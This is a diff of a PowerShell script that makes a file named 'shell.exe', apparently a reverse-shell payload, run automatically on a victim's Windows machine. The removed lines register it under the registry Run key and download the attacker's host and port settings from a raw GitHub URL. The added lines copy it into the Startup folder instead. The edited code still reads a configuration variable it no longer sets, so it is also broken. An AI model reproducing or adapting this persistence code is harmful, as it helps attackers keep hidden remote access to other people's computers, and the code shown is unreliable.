@@ -1,13 +1,11 @@
-$exePath = Join-Path -Path $PWD.Path -ChildPath "shell.exe";
+$fileName = "shell.exe"
 
-New-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" `
-    -Name "Application" `
-    -Value $exePath `
-    -PropertyType String `
-    -Force
+$sourcePath = Join-Path -Path $PWD.Path -ChildPath $fileName
 
-$url = "https://raw.githubusercontent.com/WaxArsatia/Random/refs/heads/main/lhostlport.txt"
-$configText = Invoke-RestMethod -Uri $url
+$startupFolder = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup"
+$destinationPath = Join-Path -Path $startupFolder -ChildPath $fileName
+
+Copy-Item -Path $sourcePath -Destination $destinationPath -Force
 
 $configMap = ConvertFrom-StringData -StringData $configText
 
